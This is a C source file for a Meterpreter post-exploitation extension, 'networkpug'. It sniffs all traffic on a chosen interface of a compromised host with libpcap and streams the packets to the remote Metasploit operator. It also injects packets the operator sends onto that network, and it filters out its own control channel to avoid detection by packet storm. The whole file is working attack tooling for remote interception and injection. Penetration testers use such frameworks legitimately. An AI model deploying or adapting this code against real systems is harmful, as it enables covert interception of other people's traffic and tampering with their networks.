#include "../../common/common.h"

#include <pcap/pcap.h>

#include "networkpug.h"

#include <sys/atomics.h>

typedef struct networkpug {
	char *interface;

	// is this pug active
	volatile int active;		

	// pcap structure
	// from a quick look at pcap-linux.c, pcap_inject_linux, we do not need 
	// any locking to serialize access.
	pcap_t *pcap;		

	// thread for handling recieving packets / sending to server
	THREAD *thread;		

	// XXX, do something with this. Stats on close?
	volatile int pkts_seen, pkts_injected;

	Channel *channel;
	Remote *remote;	

	unsigned char *packet_stream;
	size_t packet_stream_length;

	// PKS, potential race with socket writing / shutdowns
	// maybe ref count / spinlock via atomic instructions. need to think more :-)

} NetworkPug;

#define MAX_PUGS (128)
#define MAX_MTU (1514)

NetworkPug pugs[MAX_PUGS];

LOCK *pug_lock;

char *packet_filter;

/*
 * send packet to remote channel
 */

void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
	NetworkPug *np = (NetworkPug *)(user);
	size_t plussize = h->caplen + sizeof(u_int16_t);
	u_int16_t *size;
	unsigned char *tmp, *data;

	if(! np->active) {
		// begone, foul demon.
		dprintf("breaking loop");
		pcap_breakloop(np->pcap);
		return;
	}

	dprintf("(%s) we have %d bytes to send to metasploit :-)", np->interface, h->caplen);

	// PKS - this approach is quite hacky. A better implementation would be a record
	// based stream, but that's a lot more work, plus would probably require significant
	// changes on the ruby side.

	tmp = realloc(np->packet_stream, np->packet_stream_length + plussize + 4); // +4 - padding 
	if(tmp == NULL) {
		// memory issues? we could revert to stack, but let's drop it on the floor
		// for now.
		dprintf("memory constraint, dropping packet");
		return;
	}
	np->packet_stream = tmp;

	size = (unsigned short int *)(np->packet_stream + np->packet_stream_length);  
	*size = htons(h->caplen);
	data = (unsigned char *)(np->packet_stream + np->packet_stream_length + 2);

	memcpy(data, bytes, h->caplen);

	np->packet_stream_length += plussize;

	__atomic_inc(&(np->pkts_seen));
}


/*
 * networkpug_thread handles recieving packets from libpcap, and sending to metasploit
 */

void networkpug_thread(THREAD *thread)
{
	NetworkPug *np;
	struct timeval tv;
	fd_set rfds;
	int fd;
	int count;

	np = (NetworkPug *)(thread->parameter1);

	fd = pcap_get_selectable_fd(np->pcap);

	while(np->active && event_poll(thread->sigterm, 0) == FALSE) {
		tv.tv_sec = 1;
		tv.tv_usec = 0;

		FD_ZERO(&rfds);
		FD_SET(fd, &rfds);

		if(select(fd+1, &rfds, NULL, NULL, &tv) == 0) continue;

		count = pcap_dispatch(np->pcap, 1000, packet_handler, (u_char *)np);

		if(count > 0) {
			dprintf("pcap_dispatch returned %d", count);
		}

		if(np->packet_stream) {
			channel_write(np->channel, np->remote, NULL, 0, (PUCHAR) np->packet_stream, np->packet_stream_length, NULL);

			free(np->packet_stream);
			np->packet_stream = NULL;
			np->packet_stream_length = 0;
		}

	}
	dprintf("[%s] instructed to shutdown, thread exiting", np->interface);
}

/*
 * Find an unused pug
 */

NetworkPug *allocate_networkpug(char *interface)
{
	int idx;

	for(idx = 0; idx < MAX_PUGS; idx++) {
		if(! pugs[idx].active) {
			pugs[idx].interface = strdup(interface);
			return &pugs[idx];
		}
	}
	return NULL;
}

/*
 * free()'s a networkpug structure as allocated by allocate_networkpug()
 * Needs to be active for cleanup to proceed.
 */

void free_networkpug(NetworkPug *np, int close_channel, int destroy_channel)
{
	int cont;

	if(! np) {
		dprintf("There's a bug somewhere. trying to free a null networkpug");
		return;
	}

	dprintf("np: %p is %sactive, thread: %p, channel: %p, interface: %p, pcap: %p",
		np, np->active ? "" : "non-", np->thread, np->channel, np->interface, 
		np->pcap);

	/*
	 * There are probably some possible race conditions present here.
	 * If another thread is in write/pcap inject, etc.
	 * 
	 * Hopefully setting np->active = 0 early on and handling recieve thread
	 * first will prevent any possible issues. No guarantees, however
	 */


	cont = __atomic_swap(0, &np->active);
	
	if(! cont) {
		dprintf("Seems the pug at %p was already set free");
		return;
	}

	// np->active is now false.

	if(np->thread) {
		// Thread termination will take up to 1 second

		thread_sigterm(np->thread);
		thread_join(np->thread);
		thread_destroy(np->thread);
	}

	if(np->channel) {
		if(close_channel == TRUE) {
			// Tell the remote side we've shut down for now.
			channel_close(np->channel, np->remote, NULL, 0, NULL);
		} 

		if(destroy_channel == TRUE) {
			// the channel handler code will destroy it.
			// if we destroy it, it will end up double freeing
			// and calling abort :~(
			channel_destroy(np->channel, NULL);
		}
	}	

	if(np->interface) {
		free(np->interface);
	}

	if(np->pcap) {
		pcap_close(np->pcap);
	}

	memset(np, 0, sizeof(NetworkPug));	

	dprintf("after memset ;\\ np: %p is %sactive, thread: %p, channel: %p, interface: %p, pcap: %p",
		np, np->active ? "" : "non-", np->thread, np->channel, np->interface, 
		np->pcap);

}

NetworkPug *find_networkpug(char *interface)
{
	int idx;

	dprintf("Looking for %s", interface);

	for(idx = 0; idx < MAX_PUGS; idx++) {
		if(pugs[idx].active) 
			if(! strcmp(pugs[idx].interface, interface)) 
				return &pugs[idx];
	}

	return NULL;
}

DWORD networkpug_channel_write(Channel *channel, Packet *request,
                LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
{
	NetworkPug *np = (NetworkPug *)(context);
	DWORD result = ERROR_SUCCESS;

	dprintf("context is %p", context);

	if(! np->active) return result;

	dprintf("if it's a pug, it's for %s", np->interface);

	pcap_inject(np->pcap, buffer, bufferSize);
	*bytesWritten = bufferSize; // XXX, can't do anything if it fails really

	__atomic_inc(&(np->pkts_injected));
	
	return ERROR_SUCCESS;
}

DWORD networkpug_channel_close(Channel *channel, Packet *request, LPVOID context)
{
	int result = ERROR_SUCCESS;
	NetworkPug *np;

	lock_acquire(pug_lock);

	np = (NetworkPug *)(context);

	if(np->active) {
		dprintf("Channel shutdown requested. context = %p", context);
		dprintf("pugs is at %p, and pugs[MAX_PUGS] is %p", pugs, pugs + MAX_PUGS);

		free_networkpug((NetworkPug *)(context), FALSE, FALSE);

		dprintf("closed channel successfully");
	} else {
		dprintf("Already closed down context %p", context);
	}

	lock_release(pug_lock);

	return result;
}

DWORD request_networkpug_start(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	int result = ERROR_INVALID_PARAMETER;

	char *interface;
	char *extra_filter;
	char errbuf[PCAP_ERRBUF_SIZE+4];

	struct bpf_program bpf;
	int bpf_fail = 0;

	NetworkPug *np = NULL;

	PoolChannelOps chops;

	memset(errbuf, 0, sizeof(errbuf));
	memset(&chops, 0, sizeof(PoolChannelOps));

	lock_acquire(pug_lock);

	do {
		interface = packet_get_tlv_value_string(packet,TLV_TYPE_NETWORKPUG_INTERFACE);
		extra_filter = packet_get_tlv_value_string(packet, TLV_TYPE_NETWORKPUG_FILTER);

		if(! interface) {
			dprintf("No interface specified, bailing");
			break;
		
		}

		np = find_networkpug(interface);
		if(np) {
			dprintf("Duplicate pug found for %s!", interface);
			break;
		}

		np = allocate_networkpug(interface);

		np->remote = remote;
		np->pcap = pcap_open_live(interface, MAX_MTU, 1, 1000, errbuf);
		// xxx, add in filter support
		np->thread = thread_create((THREADFUNK) networkpug_thread, np, remote);
		
		chops.native.context = np;
		chops.native.write = networkpug_channel_write;
		chops.native.close = networkpug_channel_close;
		// interact, read don't need to be implemented.

		np->channel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chops);

		if(np->pcap) {
			char *final_filter = NULL;

			if(extra_filter) {
				asprintf(&final_filter, "%s and (%s)", packet_filter, extra_filter);
			} else {
				final_filter = strdup(packet_filter);
			}

			dprintf("final filter is '%s'", final_filter);

			bpf_fail = pcap_compile(np->pcap, &bpf, final_filter, 1, 0);

			free(final_filter);

			if(! bpf_fail)
				bpf_fail = pcap_setfilter(np->pcap, &bpf);
		}

		if(! np->pcap || ! np->thread || ! np->channel || bpf_fail) {
			dprintf("setting up network pug failed. pcap: %p, thread: %p, channel: %p, bpf_fail: %d",
				 np->pcap, np->thread, np->channel, bpf_fail);

			if(! np->pcap) {
				dprintf("np->pcap is NULL, so errbuf is '%s'", errbuf);
			}

			if(bpf_fail) {
				dprintf("setting filter failed. pcap_geterr() == '%s'", pcap_geterr(np->pcap));
			}

			break;
		}
	
		channel_set_type(np->channel, "networkpug");
		packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(np->channel));
		np->active = 1;

		thread_run(np->thread);

		result = ERROR_SUCCESS;

	} while(0);

	if(result != ERROR_SUCCESS) {
		np->active = 1;
		free_networkpug(np, FALSE, TRUE);
	}

	lock_release(pug_lock);

	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

DWORD request_networkpug_stop(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	char *interface;
	int result = ERROR_INVALID_PARAMETER;
	NetworkPug *np;

	lock_acquire(pug_lock);

	do {
		interface = packet_get_tlv_value_string(packet,TLV_TYPE_NETWORKPUG_INTERFACE);

		if(! interface) {
			dprintf("No interface specified, bailing");
			break;	
		}

		dprintf("Shutting down %s", interface);

		np = find_networkpug(interface);	// if close is called, it will fail. 

		if(np == NULL) {
			dprintf("[%s] Unable to find interface", interface);
			break;
		}

		dprintf("calling free_networkpug");
		free_networkpug(np, TRUE, FALSE);

		result = ERROR_SUCCESS;
	} while(0);
	
	lock_release(pug_lock);

	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;	
}

Command customCommands[] = 
{
	{ "networkpug_start",
	  { request_networkpug_start,                            { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	{ "networkpug_stop",
	  { request_networkpug_stop,                             { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	}
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;
	int peername_len;
	struct sockaddr peername;
	struct sockaddr_in *peername4;
	struct sockaddr_in6 *peername6;
	int port;
	char buf[256];          // future proof :-)

	memset(buf, 0, sizeof(buf));

	/*
	 * We require the ability to filter out our own traffic, as that would
	 * quickly lead to a huge packet storm on the network if we monitor
	 * the interface our traffic is on.
	 */

	// get the address/port of the connected control socket
	peername4 = NULL;
	peername6 = NULL;
	peername_len = sizeof(peername);
	getpeername(remote->fd, &peername, &peername_len);

	switch(peername.sa_family) {
		case PF_INET:
			peername4 = (struct sockaddr_in *)&peername;
			inet_ntop(AF_INET, &(peername4->sin_addr), buf, sizeof(buf)-1);
			port = ntohs(peername4->sin_port);
			break;

		case PF_INET6:
			peername6 = (struct sockaddr_in6 *)&peername;
			inet_ntop(AF_INET6, &(peername6->sin6_addr), buf, sizeof(buf)-1);
			port = ntohs(peername6->sin6_port);
			break;

		default:
			dprintf("Sorry it didn't work out :/ It's not you, it's me");
			return ERROR_INVALID_PARAMETER;
	}

	asprintf(&packet_filter, "not (ip%s host %s and tcp port %d)", 
			peername4 ? "" : "6", 
			buf, 
			port
	);

	dprintf("so our filter is '%s'", packet_filter);

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	pug_lock = lock_create();

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	int index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	free(packet_filter);
	
	lock_destroy(pug_lock);

	return ERROR_SUCCESS;
}
